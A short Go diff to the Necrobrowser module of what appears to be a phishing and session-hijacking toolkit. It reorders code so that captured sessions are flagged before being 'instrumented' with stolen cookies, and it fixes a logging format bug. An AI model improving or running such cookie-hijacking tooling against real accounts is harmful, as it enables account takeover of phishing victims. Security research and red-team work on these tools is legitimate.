@@ -176,11 +176,11 @@ func (module *Necrobrowser) CheckSessionCookies() {
 				module.Debug("error marshalling %s", err)
 			}
 
-			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), tui.Bold(tui.Red(string(rune(cookiesFound)))))
-			module.Instrument(v.ID, v.Cookies, string(j), v.UA)
-
-			// prevent the session to be instrumented twice
+			// prevent the session from being instrumented twice (set flag BEFORE calling Instrument)
 			_ = db.SetSessionAsInstrumented(v.ID)
+
+			module.Info("instrumenting %s using %d cookies", tui.Bold(tui.Red(v.ID)), cookiesFound)
+			module.Instrument(v.ID, v.Cookies, string(j), v.UA)
 		}
 	}
 }
